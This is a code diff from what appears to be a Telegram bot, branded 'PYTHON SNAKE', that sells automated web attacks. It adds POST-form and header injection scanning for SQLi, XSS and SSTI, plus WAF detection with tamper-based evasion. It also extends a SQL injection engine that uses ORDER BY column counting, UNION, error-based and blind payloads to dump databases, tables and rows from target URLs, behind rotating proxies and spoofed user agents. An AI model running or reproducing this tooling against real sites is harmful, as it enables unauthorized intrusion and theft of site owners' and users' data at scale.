+    return (H("POST SCAN" if mode == "post" else "HEADER SCAN",
+              "live — %s" % ("forms" if mode == "post" else "headers"))
+            + "\n\n" + bar2(pct, 14, spin) + "\n\n"
+            + "◆ URLs       : <code>%s / %s</code>\n" % (fmt(done), fmt(total))
+            + line2
+            + "◆ Requests   : <code>%s</code>\n" % fmt(st.get("tested", 0))
+            + "◆ Vulnerable : <code>%s</code>\n" % fmt(len(st.get("vulns") or []))
+            + "◆ Speed      : <code>%.1f URLs/s</code>\n" % speed
+            + (("◆ WAF        : <b>%s</b>\n" % esc(st.get("waf"))) if st.get("waf") else "")
+            + "◆ Elapsed    : <code>%s</code>" % fmt_eta(took))
+
+
+def _webscan_card(st: dict) -> str:
+    mode = st.get("mode", "post")
+    vulns = st.get("vulns") or []
+    n_v = len(st.get("vuln_urls") or [])
+    head = ("⚠️ <b>%d vulnerable URL(s) found</b>" % n_v) if n_v else \
+        "🛡 <b>No vulnerable URL found</b>"
+    body = (H("POST SCAN — COMPLETE" if mode == "post" else "HEADER SCAN — COMPLETE",
+              "%.1fs" % st.get("took", 0)) + "\n\n" + head + "\n\n"
+            + "📥 URLs tested    : <code>%s</code>\n" % fmt(st.get("done", 0))
+            + "🧪 Requests       : <code>%s</code>\n" % fmt(st.get("tested", 0)))
+    if mode == "post":
+        body += ("📮 Forms found    : <code>%s</code>\n" % fmt(st.get("forms", 0))
+                 + "🚫 No form        : <code>%s</code>\n" % fmt(st.get("no_form", 0)))
+        if st.get("stored"):
+            body += "💾 Stored (2nd-order): <code>%s</code>\n" % fmt(st["stored"])
+    else:
+        body += "🧾 Headers tested : <code>%s</code>\n" % fmt(st.get("headers_tested", 0))
+    if st.get("waf"):
+        body += "🛡 WAF hit        : <b>%s</b>\n" % esc(st["waf"])
+    if st.get("errors"):
+        body += "⚠️ Errors          : <code>%s</code>\n" % fmt(st["errors"])
+    if st.get("stopped"):
+        body += "⛔ Stopped early\n"
+    if vulns:
+        if st.get("by_type"):
+            body += "\n" + B("By type") + "\n" + " · ".join(
+                "%s <code>%s</code>" % (esc(k), fmt(v))
+                for k, v in sorted(st["by_type"].items(), key=lambda z: -z[1]))
+        body += "\n\n" + B("Vulnerable (%d)" % len(vulns))
+        for v in vulns[:6]:
+            body += ("\n\n%s <b>%s</b>%s\n   <code>%s</code>\n"
+                     "   <i>%s · %s · field <code>%s</code></i>"
+                     % (INJ_STYLE.get(v["type"], "⚠️"), esc(v["type"]),
+                        (" · " + esc(v.get("dbms"))) if v.get("dbms") else "",
+                        esc((v.get("url") or "")[:150]),
+                        esc(v.get("method") or "GET"), esc(v.get("form") or "")[:50],
+                        esc(v.get("param") or "")))
+        if len(vulns) > 6:
+            body += "\n\n<i>+ %d more in the file…</i>" % (len(vulns) - 6)
+    return body
+
+
+async def _run_webscan(update, context, urls, mode: str = "post", task_id: str = ""):
+    """POST forms / header injection ko asli engine se chalao + file bhejo."""
+    uid = str(update.effective_user.id)
+    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
+    if not urls:
+        await reply_msg(update).reply_text(
+            "❌ Koi URL nahi mila — full URLs bhejo (https://…)",
+            reply_markup=kb_back("m:inj"))
+        return
+    cat = context.user_data.get("inj_cat", "all")
+    stop_clear(uid)
+    tok = stop_mark(uid)
+    tid = task_id or task_new("post" if mode == "post" else "header", uid, urls,
+                              {"mode": mode, "cat": cat},
+                              title=("POST Forms — %d URLs" if mode == "post"
+                                     else "Header Scan — %d URLs") % len(urls))
+    msg = await reply_msg(update).reply_text(
+        _webscan_progress({"urls": len(urls), "done": 0, "tested": 0,
+                           "start": time.time(), "mode": mode, "vulns": []}, 0),
+        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+    spin = {"n": 0}
+    last = {"t": 0.0}
+
+    async def prog(st):
+        if time.time() - last["t"] < 2.0:
+            return
+        last["t"] = time.time()
+        spin["n"] += 1
+        try:
+            await msg.edit_text(_webscan_progress(st, spin["n"]),
+                                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
+        except Exception:
+            pass
+
+    try:
+        if mode == "post":
+            st = await post_scan(urls, cat, timeout=float(sget("inj_timeout", 8) or 8),
+                                 conc=int(sget("post_conc", 6) or 6), progress=prog,
+                                 uid=uid, max_forms=int(sget("post_forms", 2) or 2),
+                                 max_fields=int(sget("post_fields", 3) or 3),
+                                 second_order=bool(int(sget("post_stored", 1) or 0)))
+        else:
+            st = await header_scan(urls, timeout=float(sget("inj_timeout", 8) or 8),
+                                   conc=int(sget("header_conc", 8) or 8),
+                                   progress=prog, uid=uid)
+    except Exception as exc:
+        logger.exception("webscan fail: %s", exc)
+        task_finish(tid, "error", str(exc)[:160])
+        try:
+            await msg.delete()
+        except Exception:
+            pass
+        await reply_msg(update).reply_text("❌ Scan error: <code>%s</code>"
+                                           % esc(str(exc)[:200]), parse_mode=ParseMode.HTML,
+                                           reply_markup=kb_back("m:inj"))
+        return
+    task_update(tid, done=len(urls))
+    task_finish(tid, "done")
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+    vulns = st.get("vulns") or []
+    card = _webscan_card(st)
+    rows = []
+    if vulns:
+        rows.append([InlineKeyboardButton("📁 DUMP THESE %d URL(s)" % len(st["vuln_urls"]),
+                                          callback_data="df:frominj")])
+        rows.append([InlineKeyboardButton("💉 GET SCAN (same URLs)",
+                                          callback_data="inj:relast")])
+        context.user_data["last_vulns"] = vulns
+        context.user_data["inj_confirmed"] = {v["base"]: v["param"] for v in vulns
+                                              if v.get("method") in ("GET", "POST")}
+    rows.append([InlineKeyboardButton("🔁 ANOTHER %s" % ("POST" if mode == "post" else "HEADER"),
+                                      callback_data="inj:" + ("post" if mode == "post" else "header"))])
+    rows.append([InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")])
+    _kb = RK(rows)
+    for ch in chunk_lines(card)[:3]:
+        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML, reply_markup=_kb)
+    if vulns:
+        path, cnt = dump_text([v["url"] for v in vulns], "web_" + mode,
+                              "PYTHON SNAKE — %s vulnerabilities" % mode.upper())
+        await send_file(update, path, "🧪 %d %s vulnerabilit%s"
+                        % (cnt, mode.upper(), "y" if cnt == 1 else "ies"))
+        rows_csv = ["type,method,param,status,url,form,payload,evidence"]
+        for v in vulns:
+            rows_csv.append("%s,%s,%s,%s,\"%s\",\"%s\",\"%s\",\"%s\"" % (
+                v.get("type", ""), v.get("method", ""), v.get("param", ""),
+                v.get("status", ""), (v.get("url") or "").replace('"', "%22"),
+                (v.get("form") or "").replace('"', "'")[:60],
+                (v.get("payload") or "").replace('"', "'")[:60],
+                (v.get("evidence") or "").replace('"', "'")[:80]))
+        csvp = os.path.join(DUMP_DIR, "web_report_%s_%s.csv" % (mode, stamp()))
+        with open(csvp, "w", encoding="utf-8") as f:
+            f.write("\n".join(rows_csv) + "\n")
+        await send_file(update, csvp, "📊 %s report (csv)" % mode.upper())
+    context.user_data["last_webscan"] = {"mode": mode, "urls": len(urls),
+                                         "vulns": len(vulns)}
+    await_clear(context)
+
+
+async def tool_inj_post(update, context):
+    """📮 POST FORMS — page ke forms me asli injection."""
+    q = update.callback_query
+    last = context.user_data.get("last_urls") or []
+    rows = []
+    if last:
+        rows.append([InlineKeyboardButton("📥 SCAN LAST %d PARSER URLS" % len(last),
+                                          callback_data="inj:post_last")])
+    rows.append([InlineKeyboardButton("✍️ SEND URLS (pages with forms)",
+                                      callback_data="inj:post_go")])
+    rows.append([InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")])
+    txt = (H("POST FORM SCAN", "login / search / contact forms") + "\n\n"
+           + B("Kaise chalta hai") + "\n"
+           + P("Har page ke asli <code>&lt;form&gt;</code> parse hote hain (action, "
+               "method, fields). Phir baseline POST (bina payload) aur ek-ek field me "
+               "payload daal ke response compare hota hai — SQLi / XSS / SSTI.") + "\n\n"
+           + KV("Forms / page", "<code>%d</code>" % int(sget("post_forms", 2) or 2), "📮") + "\n"
+           + KV("Fields / form", "<code>%d</code>" % int(sget("post_fields", 3) or 3), "✍️") + "\n"
+           + KV("Stored (2nd-order)", "✅ ON" if int(sget("post_stored", 1) or 0)
+               else "⚪ OFF", "💾") + "\n"
+           + KV("Session", ("✅ cookie set" if user_session_get(update.effective_user.id)
+                            else "⚪ none — login pages ke liye 🍪 SESSION set karo"), "🍪")
+           + "\n\n" + P("False positive band: har finding doosre payload se confirm hoti "
+                         "hai, aur baseline fail ho to koi verdict nahi banta."))
+    try:
+        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=RK(rows))
+    except Exception:
+        pass
+    await_set(context, "inj_urls")
+    context.user_data["inj_input_mode"] = "post"
+
+
+async def tool_inj_header(update, context):
+    """🧾 HEADER INJECTION — User-Agent / Referer / XFF / Cookie."""
+    q = update.callback_query
+    last = context.user_data.get("last_urls") or []
+    rows = []
+    if last:
+        rows.append([InlineKeyboardButton("📥 SCAN LAST %d PARSER URLS" % len(last),
+                                          callback_data="inj:header_last")])
+    rows.append([InlineKeyboardButton("✍️ SEND URLS", callback_data="inj:header_go")])
+    rows.append([InlineKeyboardButton("⬅️ INJECTOR", callback_data="m:inj")])
+    txt = (H("HEADER INJECTION", "User-Agent · Referer · X-Forwarded-For · Cookie")
+           + "\n\n" + B("Kaunse headers test hote hain") + "\n"
+           + "\n".join("• <code>%s</code>" % h
+                       for h in _uniq([x[0] for x in HEADER_PROBES]))
+           + "\n\n" + P("Har header me payload daal ke response baseline se compare hota "
+                         "hai (SQL error / reflection / traversal). Log, analytics ya "
+                         "IP-based pages yahan pakde jate hain.") + "\n\n"
+           + KV("Headers", "<code>%d</code>" % len(HEADER_PROBES), "🧾") + "\n"
+           + KV("Session", ("✅ cookie set" if user_session_get(update.effective_user.id)
+                            else "⚪ none"), "🍪"))
+    try:
+        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=RK(rows))
+    except Exception:
+        pass
+    await_set(context, "inj_urls")
+    context.user_data["inj_input_mode"] = "header"
+
+
+async def cb_inj_session(update, context):
+    uid = update.effective_user.id
+    try:
+        await update.callback_query.edit_message_text(
+            session_card(uid), parse_mode=ParseMode.HTML, reply_markup=session_kb(uid))
+    except Exception:
+        pass
+
+
+async def cb_inj_session_set(update, context):
+    try:
+        await update.callback_query.edit_message_text(
+            (H("SESSION", "paste cookie / token") + "\n\n"
+             + P("Browser → DevTools → Network → koi bhi request → Request Headers → "
+                 "<code>Cookie:</code> copy karke yahan paste karo.") + "\n\n"
+             + "<code>Cookie: PHPSESSID=abc123; csrf=xyz</code>\n"
+             + "<code>Authorization: Bearer eyJhbGci…</code>\n\n"
+             + P("Sirf cookie value bhi chalega: <code>PHPSESSID=abc123</code>")),
+            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:inj"))
+    except Exception:
+        pass
+    await_set(context, "session_set")
+
+
+async def cb_inj_session_clear(update, context):
+    uid = update.effective_user.id
+    user_session_clear(uid)
+    try:
+        await update.callback_query.answer("🗑 Session cleared", show_alert=False)
+    except Exception:
+        pass
+    return await cb_inj_session(update, context)
+
+
+async def cb_inj_mode_last(update, context, mode: str):
+    urls = context.user_data.get("last_urls") or []
+    if not urls:
+        try:
+            await update.callback_query.answer("Pehle PARSER chalao", show_alert=True)
+        except Exception:
+            pass
+        return
+    return await _run_webscan(update, context, urls, mode)
+
+
+async def cb_inj_relast(update, context):
+    urls = context.user_data.get("last_urls") or []
+    if not urls:
+        urls = [v["base"] for v in (context.user_data.get("last_vulns") or [])]
+    if not urls:
+        try:
+            await update.callback_query.answer("Koi URL saved nahi", show_alert=True)
+        except Exception:
+            pass
+        return
+    return await _run_inject(update, context, urls)
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -11477,14 +12446,16 @@ def _sqli_split(raw: str) -> list:
     return [x.strip() for x in str(raw or "").split(SQLI_SEP) if x.strip()]
 
 
-async def _sqli_req(session, url: str, timeout: float, rot=None, budget=None) -> dict:
-    """Ek request — rot proxy pehle. budget ho to request count hoti hai."""
+async def _sqli_req(session, url: str, timeout: float, rot=None, budget=None,
+                    hdrs: dict = None) -> dict:
+    """Ek request — rot proxy pehle, session headers merge. budget ho to count hoti hai."""
     if budget is not None:
         if budget.get("left", 0) <= 0:
             return {"status": 0, "len": 0, "body": "", "err": "budget"}
         budget["left"] = budget.get("left", 0) - 1
         budget["used"] = budget.get("used", 0) + 1
-    kw = {"headers": {"User-Agent": random.choice(UA_LIST), "Accept": "*/*"},
+    kw = {"headers": _merge_hdrs({"User-Agent": random.choice(UA_LIST), "Accept": "*/*"},
+                                 hdrs or {}),
           "timeout": aiohttp.ClientTimeout(total=timeout), "ssl": False,
           "allow_redirects": True, "max_redirects": 4}
     if rot:
@@ -11623,12 +12594,12 @@ def sqli_sql(dbms: str, key: str, table: str = "", cols=None, offset: int = 0) -
 
 # ── detection ───────────────────────────────────────────────────────────────
 async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
-                      rot=None, budget=None) -> dict:
+                      rot=None, budget=None, hdrs: dict = None) -> dict:
     """URL ke ek param me asli injection hai? TRUE vs FALSE page ka farq dekho."""
     out = {"raw": raw, "param": param, "ok": False, "why": "", "dbms": "",
            "tech": "", "quote": "", "comment": "", "true": None, "false": None,
-           "base": None, "noise": 0}
-    base = await _sqli_req(session, raw, timeout, rot, budget)
+           "base": None, "noise": 0, "waf": "", "tamper": "", "hdrs": hdrs or {}}
+    base = await _sqli_req(session, raw, timeout, rot, budget, hdrs)
     if not base.get("status"):
         out["why"] = "no response (%s)" % (base.get("err") or "timeout")
         return out
@@ -11636,21 +12607,29 @@ async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
         out["why"] = "blocked (HTTP %s)" % base["status"]
         return out
     out["base"] = base
+    out["waf"] = waf_detect(base.get("status"), base.get("headers"), base.get("body"))
     err_hits = []          # (quote, comment, dbms)
     dbms_seen = _sqli_dbms_of([base])
     for q, c in SQLI_STYLES:
         # 1) DB error — sirf quote bhejo
         e = await _sqli_req(session, _sqli_url(raw, param, q + " " + c),
-                            timeout, rot, budget)
+                            timeout, rot, budget, hdrs)
         db = _sqli_dbms_of([e])
         dbms_seen = dbms_seen or db
+        if not out["waf"]:
+            out["waf"] = waf_detect(e.get("status"), e.get("headers"), e.get("body"))
         if db and not _sqli_dbms_of([base]) and e.get("status"):
             err_hits.append((q, c, db))
         # 2) boolean — TRUE page base jaisa, FALSE page alag
         t = await _sqli_req(session, _sqli_url(raw, param, q + " AND 1=1 " + c),
-                            timeout, rot, budget)
+                            timeout, rot, budget, hdrs)
         f = await _sqli_req(session, _sqli_url(raw, param, q + " AND 1=2 " + c),
-                            timeout, rot, budget)
+                            timeout, rot, budget, hdrs)
+        if not out["waf"]:
+            for _r in (t, f):
+                out["waf"] = waf_detect(_r.get("status"), _r.get("headers"), _r.get("body"))
+                if out["waf"]:
+                    break
         if not t.get("status") or not f.get("status"):
             continue
         dbms_seen = dbms_seen or _sqli_dbms_of([t, f])
@@ -11661,6 +12640,33 @@ async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
             out.update(ok=True, tech="boolean", quote=q, comment=c, true=t, false=f,
                        noise=noise, dbms=dbms_seen or "")
             break
+    if not out["ok"] and out.get("waf"):
+        #  v2.23.0 — WAF-aware: wahi styles, tampered payload se ek aur chakkar
+        for _mode in ("comment", "case"):
+            for q, c in SQLI_STYLES[:3]:
+                if budget is not None and budget.get("left", 0) < 8:
+                    break
+                _p = waf_tamper(q + " AND 1=2 " + c, _mode)
+                _pt = waf_tamper(q + " AND 1=1 " + c, _mode)
+                t = await _sqli_req(session, _sqli_url(raw, param, _pt),
+                                    timeout, rot, budget, hdrs)
+                f = await _sqli_req(session, _sqli_url(raw, param, _p),
+                                    timeout, rot, budget, hdrs)
+                if not t.get("status") or not f.get("status"):
+                    continue
+                d_tb = _sqli_diff(_sqli_body(t), _sqli_body(base))
+                d_tf = _sqli_diff(_sqli_body(t), _sqli_body(f))
+                if d_tf >= 1 and d_tf > d_tb and d_tb <= max(30, int(0.03 * len(_sqli_norm(_sqli_body(base))))):
+                    out.update(ok=True, tech="boolean+waf(%s)" % _mode, quote=q,
+                               comment=c, true=t, false=f, noise=d_tb,
+                               tamper=_mode, dbms=_sqli_dbms_of([t, f, base]) or "MySQL")
+                    break
+            if out["ok"]:
+                break
+        if not out["ok"]:
+            out["why"] = "WAF (%s) ne block kiya — tamper ke baad bhi output nahi" % out["waf"]
+            return out
+
     if not out["ok"]:
         if err_hits:
             q, c, db = err_hits[0]
@@ -11670,10 +12676,10 @@ async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
             for q, c in (("'", "-- -"), ("", "-- -")):
                 t1 = time.time()
                 r1 = await _sqli_req(session, _sqli_url(raw, param, (q + " AND SLEEP(0) " + c).strip()),
-                                     timeout, rot, budget)
+                                     timeout, rot, budget, hdrs)
                 t2 = time.time()
                 r2 = await _sqli_req(session, _sqli_url(raw, param, (q + " AND SLEEP(2) " + c).strip()),
-                                     timeout, rot, budget)
+                                     timeout, rot, budget, hdrs)
                 t3 = time.time()
                 if r1.get("status") and r2.get("status") and (t3 - t2) - (t2 - t1) > 1.2:
                     out.update(ok=True, tech="time", quote=q, comment=c, dbms="MySQL")
@@ -11687,6 +12693,15 @@ async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
     return out
 
 
+def _sqli_case(det: dict, suffix: str) -> str:
+    """Payload → URL. WAF mila ho to pehle tampered shape (v2.23.0)."""
+    sfx = str(suffix or "")
+    mode = det.get("tamper") or ""
+    if mode:
+        sfx = waf_tamper(sfx, mode)
+    return _sqli_url(det.get("raw") or "", det.get("param") or "", sfx)
+
+
 async def _sqli_cols(session, det: dict, timeout: float, rot=None, budget=None) -> int:
     """ORDER BY se column count — linear (1-6) + binary search (7-30).
 
@@ -11698,10 +12713,11 @@ async def _sqli_cols(session, det: dict, timeout: float, rot=None, budget=None) 
     true_body = _sqli_body(det.get("true")) or _sqli_body(det.get("base"))
     noise = max(30, int(det.get("noise", 0) or 0) + 10)
 
+    hdrs = det.get("hdrs") or {}
+
     async def valid(n: int) -> bool:
-        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"],
-                                               "%s ORDER BY %d %s" % (q, n, c)),
-                            timeout, rot, budget)
+        r = await _sqli_req(session, _sqli_case(det, "%s ORDER BY %d %s" % (q, n, c)),
+                            timeout, rot, budget, hdrs)
         if not r.get("status"):
             return False
         return _sqli_diff(_sqli_body(r), true_body) <= noise
@@ -11733,8 +12749,8 @@ async def _sqli_union_pos(session, det: dict, cols: int, timeout: float,
         expr = ["1"] * cols
         expr[i] = _sqli_wrap(det.get("dbms") or "MySQL", "SELECT '%s'" % SQLI_MARK)
         payload = "%s UNION SELECT %s %s" % (q, ", ".join(expr), c)
-        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
-                            timeout, rot, budget)
+        r = await _sqli_req(session, _sqli_case(det, payload),
+                            timeout, rot, budget, det.get("hdrs"))
         if r.get("status") and (SQLI_MARK * 2) in _html.unescape(_sqli_body(r)):
             return i + 1
     return 0
@@ -11748,8 +12764,8 @@ async def _sqli_union_text(session, det: dict, cols: int, pos: int, sql: str,
     expr[pos - 1] = _sqli_wrap(det.get("dbms") or "MySQL", sql)
     payload = "%s UNION SELECT %s %s" % (det["quote"], ", ".join(expr),
                                          det["comment"])
-    r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
-                        timeout, rot, budget)
+    r = await _sqli_req(session, _sqli_case(det, payload),
+                        timeout, rot, budget, det.get("hdrs"))
     body = _html.unescape(_sqli_body(r))
     m = re.search(re.escape(SQLI_MARK) + r"(.*?)" + re.escape(SQLI_MARK), body, re.S)
     if not m:
@@ -11768,9 +12784,8 @@ async def _sqli_error_text(session, det: dict, sql: str, timeout: float,
                            rot=None, budget=None) -> str:
     if not sql:
         return ""
-    r = await _sqli_req(session, _sqli_url(det["raw"], det["param"],
-                                           _sqli_error_payload(det, sql)),
-                        timeout, rot, budget)
+    r = await _sqli_req(session, _sqli_case(det, _sqli_error_payload(det, sql)),
+                        timeout, rot, budget, det.get("hdrs"))
     body = _html.unescape(_sqli_body(r))
     m = re.search(r"Duplicate entry '(.+?)' for key", body, re.I | re.S)
     if not m:
@@ -11794,8 +12809,8 @@ async def _sqli_blind_text(session, det: dict, sql: str, maxlen: int, timeout: f
 
     async def cond(expr: str) -> bool:
         payload = "%s AND (%s) %s" % (det["quote"], expr, det["comment"])
-        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
-                            timeout, rot, budget)
+        r = await _sqli_req(session, _sqli_case(det, payload),
+                            timeout, rot, budget, det.get("hdrs"))
         if not r.get("status") or r.get("status") >= 500:
             return False
         if dbms_fingerprint(_sqli_body(r)):
@@ -11843,14 +12858,16 @@ async def _sqli_text(session, det: dict, sql: str, cols: int, pos: int, caps: di
 
 
 async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
-                        timeout: float = 8.0, rot=None, on_stage=None) -> dict:
+                        timeout: float = 8.0, rot=None, on_stage=None,
+                        uid=None) -> dict:
     """Ek URL ka dump: param dhoondo → db → tables → columns → rows."""
     caps = caps or {}
     t0 = time.time()
     res = {"url": raw, "param": param, "ok": False, "status": "", "dbms": "", "tech": "",
            "quote": "", "comment": "", "db": "", "dbs": [], "tables": {},
            "notes": [], "rows": 0, "requests": 0, "took": 0, "why": "",
-           "large": False, "large_reason": "", "poc": "", "tables_total": 0}
+           "large": False, "large_reason": "", "poc": "", "tables_total": 0,
+           "waf": "", "tamper": ""}
     budget = {"left": int(caps.get("requests", 500)), "used": 0}
     max_tables = int(caps.get("tables", 8))
     max_rows = int(caps.get("rows", 8))
@@ -11872,7 +12889,8 @@ async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
             break
         if on_stage:
             await on_stage("detect", "%s (%s)" % (urlparse(raw).path[-26:] or "/", pn))
-        det = await sqli_detect(session, raw, pn, timeout, rot, budget)
+        det = await sqli_detect(session, raw, pn, timeout, rot, budget,
+                                hdrs=(user_session_headers(uid) if uid else None))
         if det.get("ok"):
             res["param"] = pn
             break
@@ -11897,7 +12915,8 @@ async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
                 break
         det["dbms"] = dbms
     res.update(ok=True, status="injectable", dbms=dbms, tech=det.get("tech") or "",
-               quote=det.get("quote") or "", comment=det.get("comment") or "")
+               quote=det.get("quote") or "", comment=det.get("comment") or "",
+               waf=det.get("waf") or "", tamper=det.get("tamper") or "")
     if det.get("tech") == "time":
         res.update(status="time-based blind", tech="time-based",
                    notes=["time-based injection confirmed — data extraction skipped "
@@ -12098,7 +13117,7 @@ async def sqli_dump(urls: list, targets=None, caps=None, timeout: float = 8.0,
                 return
             try:
                 res = await sqli_dump_one(session, raw, param or "", caps, timeout, rot,
-                                          stage)
+                                          stage, uid=uid)
             except Exception as exc:
                 res = {"url": raw, "status": "error", "why": str(exc)[:90], "tables": {},
                        "dbs": [], "rows": 0, "took": 0, "requests": 0, "ok": False,
@@ -12276,6 +13295,7 @@ async def dump_harvest(urls: list, progress=None, uid=None, timeout: float = 10.
             zf.write(js, arcname="summary.json")
     except Exception as exc:
         logger.warning("dump pack zip fail: %s", exc)
+    st["waf"] = next((r.get("waf") for r in (st.get("results") or []) if r.get("waf")), "")
     st["files"] = made
     st["zip"] = zpath if os.path.exists(zpath) else ""
     st["csv"] = summary_csv if os.path.exists(summary_csv) else ""
@@ -12525,9 +13545,14 @@ def _dump_status_line(res: dict) -> str:
             esc(res.get("large_reason") or "more data than the inline cap")[:90],
             esc((res.get("poc") or res.get("url") or "")[:180]))
     if res.get("ok"):
-        return "✅ <b>%s</b>\n   <i>%s · %s · param <code>%s</code> · %d tables · %d rows</i>" % (
-            esc(host[:44]), esc(res.get("dbms") or "-"), esc(res.get("tech") or "-"),
-            esc(res.get("param") or "-"), len(res.get("tables") or {}), res.get("rows", 0))
+        return ("✅ <b>%s</b>\n   <i>%s · %s · param <code>%s</code> · %d tables · %d rows</i>%s"
+                % (esc(host[:44]), esc(res.get("dbms") or "-"), esc(res.get("tech") or "-"),
+                   esc(res.get("param") or "-"), len(res.get("tables") or {}),
+                   res.get("rows", 0),
+                   ("\n   <i>🛡 %s%s</i>" % (esc(res.get("waf") or ""),
+                                              (" · tamper: " + esc(res.get("tamper")))
+                                              if res.get("tamper") else ""))
+                   if res.get("waf") else ""))
     return "⛔ <b>%s</b> — <i>%s</i>" % (
         esc(host[:44]), esc((res.get("why") or res.get("status") or "not injectable")[:80]))
 
@@ -12607,6 +13632,8 @@ async def _run_sqldump(update, context, urls, targets=None, task_id: str = ""):
                if _no_param else "")
             + (("⛔ Not tested (stopped): <code>%s</code>\n" % fmt(st.get("skipped", 0)))
                if st.get("skipped") else "")
+            + (("🛡 WAF detected : <b>%s</b> <i>(tamper se retry kiya)</i>\n"
+                % esc(st["waf"])) if st.get("waf") else "")
             + ("⚠️ Large data: <code>%s</code> URL(s) — use a powerful tool\n" % fmt(len(large))
                if large else "")
             + (("ℹ️ <i>Injector \"vulnerable\" = payload reflect/error mila. "
@@ -14919,6 +15946,7 @@ async def input_admin_msg(update, context, text: str):
 AWAIT_HANDLERS["support_msg"] = lambda *a, **k: input_support(*a, **k)
 AWAIT_HANDLERS["myproxy"] = lambda *a, **k: input_myproxy(*a, **k)
 AWAIT_HANDLERS["admin_msg"] = lambda *a, **k: input_admin_msg(*a, **k)
+AWAIT_HANDLERS["session_set"] = lambda *a, **k: input_session(*a, **k)
 
 
 TOOL_HANDLERS = {
@@ -16004,6 +17032,11 @@ BATCH_KEYS = {
     "precheck": ("inj_precheck", 0, 300, "Precheck time cap (s, 0=off)", 45, "🏓"),
     "hostgap": ("inj_host_gap_ms", 0, 2000, "Per-host gap (ms, 0=off)", 50, "⏳"),
     "rawcap":  ("parse_raw_cap", 1000, 1000000, "Parser raw URL cap", 200000, "🧾"),
+    "postconc": ("post_conc", 1, 24, "POST scan: parallel pages", 6, "📮"),
+    "postforms": ("post_forms", 1, 10, "POST scan: forms per page", 2, "📄"),
+    "postfields": ("post_fields", 1, 10, "POST scan: fields per form", 3, "✍️"),
+    "poststored": ("post_stored", 0, 1, "POST scan: stored (2nd-order) check", 1, "💾"),
+    "headerconc": ("header_conc", 1, 24, "Header scan: parallel pages", 8, "🧾"),
     "discover": ("inj_discover", 0, 1, "Injector: param discovery (0/1)", 0, "🔎"),
     "discovercap": ("inj_discover_cap", 10, 5000, "Discovery: max URLs per scan", 300, "🧭"),
     "discovernames": ("inj_discover_names", 2, 40, "Discovery: param names per URL", 12, "📛"),
@@ -16045,6 +17078,9 @@ def batch_card() -> str:
             "<code>/batch paramonly 1</code> — parser: sirf param wale URLs " 
             "(0 = all, auto = dork ke hisaab se)\n"
             "<code>/batch discover 1</code> — injector: paramless URLs ke asli params\n"
+            "<code>/batch postforms 2</code> · <code>/batch postfields 3</code>\n"
+            "<code>/batch poststored 1</code> — POST scan: stored XSS check\n"
+            "<code>/batch headerconc 8</code> — header scan parallel pages\n"
             "<code>/batch trial 1</code> — trial lock ON (files locked)\n\n"
             "<i>Proxy batching checks 60k proxies in slices: 4k → next 4k → … "
             "until every one is done. 2000–4000 is best on a phone.</i>")
@@ -16397,6 +17433,8 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
         gj = "⏸ 5 min cooldown"
     else:
         gj = "✅ ON (%d ok / %d fail)" % (GJ_STATE["ok"], GJ_STATE["fail"])
+    _pu = str(getattr(update.effective_user, "id", "") or "")
+    _sess = bool((user_session_get(_pu) or {}).get("cookie"))
     txt = (H("PONG", "%s ms" % ms) + "\n\n"
            "🟢 Bot zinda hai\n"
            "🤖 @%s\n"
@@ -16410,6 +17448,7 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
            "📦 Core: <b>%s</b>\n"
            "🧩 Build: <code>%s</code>\n"
            "🛡 Silent-guard: %s · 💉 payloads: <code>%d</code> · ⚙️ parser-cfg: %s\n"
+           "📮 POST: <code>%d form / %d field</code> · 🧾 Headers: <code>%d</code> · 🍪 Session: %s\n"
            "🔐 Config: %s\n"
            "📁 File: <code>%s</code>\n"
            "🗂 Folder: <code>%s</code>\n"
@@ -16423,6 +17462,8 @@ async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
                  "✅ ON" if globals().get("SILENT_GUARD") else "⚠️ OFF",
                  len(INJ_PROBES),
                  "✅ ON" if "cb_parse_cfg" in globals() else "⚠️ OFF",
+                 sget("post_forms", 2), sget("post_fields", 3), sget("header_conc", 8),
+                 ("✅ ON" if _sess else "⚪ OFF"),
                  ("<code>%s</code> · admins %d" %
                   (os.path.basename(CONFIG_PATH) if CONFIG_PATH else "⚠️ none (bot.py se)",
                    len(ADMIN_IDS))),
